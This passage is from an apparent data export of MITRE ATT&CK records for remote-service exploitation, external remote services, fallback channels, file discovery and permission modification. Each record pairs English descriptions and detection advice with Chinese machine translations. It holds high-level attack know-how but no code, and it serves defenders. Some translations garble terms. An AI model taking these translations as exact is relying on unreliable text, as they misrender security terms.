Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",https://attack.mitre.org/techniques/T1210,18 April 2018,24 February 2022,1.1,Lateral Movement,"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of [Discovery](https://attack.mitre.org/tactics/TA0007), or other unusual network traffic that may indicate additional tools transferred to the system.","Linux, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content",False,,,ExtraHop,User,,"Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network.",,,,"(Citation: MS17-010 March 2017),(Citation: Kaspersky Flame Functionality),(Citation: US-CERT NotPetya 2017),(Citation: Symantec Cicada November 2020),(Citation: Github PowerShell Empire),(Citation: Secure List Bad Rabbit),(Citation: DFIR Ryuk's Return October 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: FireEye WannaCry 2017),(Citation: ESET Trickbot Oct 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET InvisiMole June 2020),(Citation: US-CERT WannaCry 2017),(Citation: FireEye APT28),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Talos Nyetya June 2017),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: Red Canary Emotet Feb 2019),(Citation: Kaspersky Flame),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: LogRhythm WannaCry),(Citation: GitHub PoshC2),(Citation: SANS Conficker),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: US-CERT Emotet Jul 2018),(Citation: Secureworks Emotet Nov 2018),(Citation: Symantec Emotet Jul 2018),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: Wikipedia Control Flow Integrity),(Citation: TechNet Moving Beyond EMET),(Citation: Ars Technica Pwn2Own 2017 VM Escape)",利用远程服务漏洞,一旦进入网络，攻击者可能会利用远程服务获得对内部系统的未经授权的访问。当攻击者利用程序、服务或操作系统软件或内核本身中的编程错误来执行攻击者控制的代码时，就会利用软件漏洞。对远程服务进行攻击后利用的一个共同目标是横向移动以实现对远程系统的访问。攻击者可能需要确定远程系统是否处于易受攻击状态，这可以通过 [网络服务发现](https://attack.mitre.org/techniques/T1046) 或其他寻找常见、易受攻击的发现方法来完成可能部署在网络中的软件，缺少可能表明漏洞的某些补丁，或可用于检测或遏制远程利用的安全软件。服务器可能是横向移动利用的高价值目标，但如果它们提供优势或访问额外资源，终端系统也可能面临风险。常见服务中存在几个众所周知的漏洞，例如 SMB（引用：CIS 多个 SMB 漏洞）和 RDP（引用：NVD CVE-2017-0176）以及可能在内部网络中使用的应用程序，例如 MySQL（引用：NVD CVE-2016-6662）和 Web 服务器服务。（引用：NVD CVE-2014-7169）根据易受攻击的远程服务的权限级别，攻击者可能会实现 [利用权限提升]（https://attack .mitre.org/techniques/T1068）也是横向运动利用的结果。
T1133,External Remote Services,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",https://attack.mitre.org/techniques/T1133,31 May 2017,16 June 2022,2.4,"Initial Access, Persistence","Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.

When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.","Containers, Linux, Windows, macOS","Application Log: Application Log Content, Logon Session: Logon Session Metadata, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; Brad Geesaman, @bradgeesaman; Daniel Oakley; David Fiser, @anu4is, Trend Micro; David Tayouri; ExtraHop; Idan Frimark, Cisco; Jay Chen, Palo Alto Networks; Magno Logan, @magnologan, Trend Micro; Rory McCune, Aqua Security; Travis Smith, Tripwire; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team; Yuval Avrahami, Palo Alto Networks",,,,CAPEC-555,,,"(Citation: Microsoft GALLIUM December 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Cycraft Chimera April 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Secureworks REvil September 2019),(Citation: Anomali Linux Rabbit 2018),(Citation: Microsoft NICKEL December 2021),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: RSA2017 Detect and Respond Adair),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: FireEye Respond Webinar July 2017),(Citation: McAfee Night Dragon),(Citation: NCSC APT29 July 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Intezer TeamTNT September 2020),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Dell TG-3390),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye TRITON 2019),(Citation: Aqua Kinsing April 2020),(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: US-CERT TA18-074A),(Citation: BlackBerry CostaRicto November 2020),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: ESET Telebots June 2017),(Citation: ESET BlackEnergy Jan 2016),(Citation: ANSSI Sandworm January 2021),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Intezer Doki July 20),",外部远程服务,攻击者可能会利用面向外部的远程服务来初始访问和/或在网络中持续存在。 VPN、Citrix 和其他访问机制等远程服务允许用户从外部位置连接到内部企业网络资源。通常有远程服务网关来管理这些服务的连接和凭据身份验证。也可以使用[Windows远程管理](https://attack.mitre.org/techniques/T1021/006)和[VNC](https://attack.mitre.org/techniques/T1021/005)等服务（引用：用于远程桌面的 MacOS VNC 软件）访问 [有效帐户](https://attack.mitre.org/techniques/T1078) 以使用该服务通常是一项要求，这可以通过凭证域名或通过在破坏企业网络后从用户那里获取凭据。（引用：Volexity Virtual Private Keylogging）访问远程服务可以用作操作期间的冗余或持久访问机制。也可以通过不需要身份验证的公开服务获得访问权限。在容器化环境中，这可能包括暴露的 Docker API、Kubernetes API 服务器、kubelet 或 Web 应用程序，例如 Kubernetes 仪表板。（引用：趋势科技暴露的 Docker 服务器）（引用：Unit 42 Hildegard Malware）
T1008,Fallback Channels,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,https://attack.mitre.org/techniques/T1008,31 May 2017,14 July 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Mandiant APT1),(Citation: DustySky),(Citation: FireEye APT30),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Fidelis Turbo),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Unit 42 Valak July 2020),(Citation: ESET Sednit Part 1),(Citation: NCC Group Team9 June 2020),(Citation: McAfee Night Dragon),(Citation: ESET Machete July 2019),(Citation: ESET PipeMon May 2020),(Citation: Novetta Blockbuster RATs),(Citation: Symantec Linfo May 2012),(Citation: ESET Crutch December 2020),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Securelist MiniDuke Feb 2013),(Citation: ESET Sednit Part 2),(Citation: FireEye APT41 Aug 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FOX-IT May 2016 Mofang),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Novetta Blockbuster),(Citation: ESET Ebury Oct 2017),(Citation: Unit42 RDAT July 2020),(Citation: Mandiant APT1 Appendix),(Citation: Unit 42 Kazuar May 2017),(Citation: Bitdefender Naikon April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: ESET Dukes October 2019),(Citation: OilRig ISMAgent July 2017),(Citation: Check Point APT34 April 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Mythc Documentation),(Citation: Proofpoint Bumblebee April 2022),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ANSSI Sandworm January 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Baumgartner Naikon 2015),(Citation: Talos TinyTurla September 2021),(Citation: Cylance Dust Storm),(Citation: University of Birmingham C2)",备用通道,如果主要通道受到损害或无法访问，攻击者可能会使用备用或备用通信通道，以维持可靠的命令和控制并避免数据传输阈值。
T1083,File and Directory Discovery,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)",https://attack.mitre.org/techniques/T1083,31 May 2017,06 September 2022,1.5,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.  ","Linux, Network, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,"Austin Clark, @c2defense",,,"Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls","CAPEC-127, CAPEC-497",,,"(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Fidelis njRAT June 2013),(Citation: ESET Gamaredon June 2020),(Citation: Symantec Remsec IOCs),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Operation Groundbait),(Citation: Cylance Machete Mar 2017),(Citation: FireEye Clandestine Fox),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT10 April 2017),(Citation: Symantec Hydraq Jan 2010),(Citation: KISA Operation Muzabi),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye APT34 Dec 2017),(Citation: TrendMicro macOS Dacls May 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: CIRCL PlugX March 2013),(Citation: Symantec Dragonfly),(Citation: 20 macOS Common Tools and Techniques),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: 360 Machete Sep 2020),(Citation: objective-see windtail1 dec 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Cymmetria Patchwork),(Citation: Avira Mustang Panda January 2020),(Citation: Aqua Kinsing April 2020),(Citation: Check Point APT34 April 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Cylance Dust Storm),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: Check Point Warzone Feb 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Lazarus APT January 2022),(Citation: Securelist MuddyWater Oct 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: Securelist APT10 March 2021),(Citation: Cylance Shell Crew Feb 2017),(Citation: Fortinet Diavol July 2021),(Citation: Volexity PowerDuke November 2016),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Intezer Doki July 20),(Citation: Rancor Unit42 June 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: ESET Machete July 2019),(Citation: Rclone),(Citation: Microsoft POLONIUM June 2022),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: Dell TG-3390),(Citation: Microsoft WhisperGate January 2022),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: ASERT Donot March 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: PaloAlto DNS Requests May 2016),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Riskiq Remcos Jan 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: Trend Micro Ransomware February 2021),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT32 May 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: Symantec Cicada November 2020),(Citation: Symantec Inception Framework March 2018),(Citation: Kaspersky Sofacy),(Citation: Securelist Octopus Oct 2018),(Citation: Camba RARSTONE),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: Intel 471 REvil March 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET ForSSHe December 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: NCC Group Fivehands June 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: McAfee Night Dragon),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: Unit 42 PingPull Jun 2022),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Talos Konni May 2017),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Baumgartner Naikon 2015),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cisco Talos Intelligence Group),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Symantec Pasam May 2012),(Citation: Secureworks REvil September 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ATT Sidewinder January 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Kaspersky Turla),(Citation: Talos Oblique RAT March 2021),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2018),(Citation: CrowdStrike IceApple May 2022),(Citation: FOX-IT May 2016 Mofang),(Citation: GitHub Sliver File System August 2021),(Citation: Korean FSI TA505 2020),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: GitHub PoshC2),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: objective-see windtail2 jan 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: F-Secure The Dukes),(Citation: CrowdStrike Ryuk January 2019),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: DustySky),(Citation: Fidelis Turbo),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: CrowdStrike Putter Panda),(Citation: objsee mac malware 2017),(Citation: TrendMicro BlackTech June 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: XAgentOSX 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: Securelist ScarCruft May 2019),(Citation: Novetta-Axiom),(Citation: NCC Group Chimera January 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye EPS Awakens Part 2),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Smoke Loader July 2018),(Citation: Volexity SolarWinds),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET Sednit Part 2),(Citation: Talos Promethium June 2020),(Citation: Accenture Dragonfish Jan 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: McAfee Cuba April 2021),(Citation: Unit42 Redaman January 2019),(Citation: Trend Micro KillDisk 2),(Citation: Cisco Ukraine Wipers January 2022),(Citation: McAfee Oceansalt Oct 2018),(Citation: ESET Industroyer),(Citation: Symantec Frutas Feb 2013),(Citation: DOJ GRU Indictment Jul 2018),(Citation: IBM MegaCortex),(Citation: US-CERT Volgmer Nov 2017),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Talent-Jump Clambling February 2020),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: evolution of pirpi),(Citation: Securelist Kimsuky Sept 2013),(Citation: Microsoft NICKEL December 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: F-Secure Cosmicduke),(Citation: Unit 42 WhisperGate January 2022),(Citation: FireEye WannaCry 2017),(Citation: Lotus Blossom Jun 2015),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET ComRAT May 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Talos ZxShell Oct 2014),(Citation: ZScaler Hacking Team),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: FireEye APT41 March 2020),(Citation: Symantec Leafminer July 2018),(Citation: Fysbis Dr Web Analysis),(Citation: Talos PoetRAT April 2020),(Citation: ESET Gelsemium June 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: CarbonBlack Conti July 2020),(Citation: FireEye FiveHands April 2021),(Citation: F-Secure BlackEnergy 2014),(Citation: LogRhythm WannaCry),(Citation: Dragos Crashoverride 2018),(Citation: ESET Attor Oct 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: ESET Turla PowerShell May 2019),(Citation: CME Github September 2018),(Citation: ATT QakBot April 2021),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Trend Micro Tick November 2019),(Citation: FinFisher Citation),(Citation: ESET OceanLotus Mar 2019),(Citation: FireEye APT17),(Citation: Microsoft DUBNIUM July 2016),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: Trend Micro Trickbot Nov 2018),(Citation: McAfee Babuk February 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: Palo Alto DNS Requests),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Qualys Hermetic Wiper March 2022),(Citation: FireEye admin@338),(Citation: TechNet Dir),(Citation: Forcepoint Monsoon),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: Unit 42 BackConfig May 2020),(Citation: Kaspersky Turla Aug 2014),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: McAfee Gold Dragon),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Radware Micropsia July 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: Accenture MUDCARP March 2019),(Citation: ESET Ebury Oct 2017),(Citation: McAfee GhostSecret),(Citation: US-CERT TA18-074A),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye MESSAGETAP October 2019),(Citation: Eset Ramsay May 2020),(Citation: Microsoft Actinium February 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 BadPatch Oct 2017),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: NCCGroup RokRat Nov 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Talos GravityRAT),(Citation: Talos Kimsuky Nov 2021),(Citation: Symantec Orangeworm April 2018),(Citation: ESET DazzleSpy Jan 2022),(Citation: Kaspersky Winnti April 2013),(Citation: Kaspersky Sodin July 2019),(Citation: CyberBit Dtrack),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT30),(Citation: Leonardo Turla Penquin May 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: Symantec Linfo May 2012),(Citation: Mcafee Clop Aug 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FireEye APT10 Sept 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: sentinelone shlayer to zshlayer),(Citation: Palo Alto Rover),(Citation: Medium S2W WhisperGate January 2022),(Citation: CISA Zebrocy Oct 2020),(Citation: Securelist Sofacy Feb 2018),(Citation: Microsoft FinFisher March 2018),",文件和目录发现,攻击者可能会枚举文件和目录，或者可能在主机或网络共享的特定位置搜索文件系统中的某些信息。攻击者可以在自动发现期间使用来自 [文件和目录发现](https://attack.mitre.org/techniques/T1083) 的信息来塑造后续行为，包括攻击者是否完全感染目标和/或尝试特定的动作。许多命令外壳实用程序可用于获取此信息。示例包括 <code>dir</code>、<code>tree</code>、<code>ls</code>、<code>find</code> 和 <code>locate</code>。（引文: Windows 命令 JPCERT) 自定义工具也可用于收集文件和目录信息并与 [Native API] (https://attack.mitre.org/techniques/T1106) 交互。攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 来收集文件和目录信息（例如 <code>dir</code>、<code>显示闪存</code>和/或<code>nvram</code>）。（引用：US-CERT-TA18-106A）
T1222,File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",https://attack.mitre.org/techniques/T1222,17 October 2018,19 October 2022,2.2,Defense Evasion,"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.

Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)","Linux, Windows, macOS","Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation",False,,File system access controls,"CrowdStrike Falcon OverWatch; Jan Miller, CrowdStrike",,,,,,,",(Citation: create_sym_links)",文件和目录权限修改,攻击者可能会修改文件或目录权限/属性以逃避访问控制列表 (ACL) 并访问受保护的文件。（引文：Hybrid Analysis Icacls1 June 2018）（引文：Hybrid Analysis Icacls2 May 2018）文件和目录权限通常由配置的 ACL 管理由文件或目录所有者，或具有适当权限的用户。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。修改可能包括更改特定的访问权限，这可能需要根据文件或目录的现有权限获得文件或目录的所有权和/或提升的权限。这可能会启用恶意活动，例如修改、替换或删除特定文件或目录。对许多技术来说，特定的文件和目录修改可能是必需的步骤，例如通过 [Accessibility Features](https://attack.mitre.org/techniques/T1546/008)、[Boot or Logon Initialization Scripts](https ://attack.mitre.org/techniques/T1037)，[Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004)，或通过[污染/劫持其他工具二进制/配置文件劫持执行流程](https://attack.mitre.org/techniques/T1574)。攻击者也可能改变符号链接的权限。例如，恶意软件（尤其是勒索软件）可能会修改符号链接和相关设置，以允许从具有远程路径的本地快捷方式访问文件。（引用：new_rust_based_ransomware）（引用：bad_luck_blackcat）（引用：falconoverwatch_blackcat_attack）（引用：blackmatter_blackcat）（引用： fsutil_behavior)
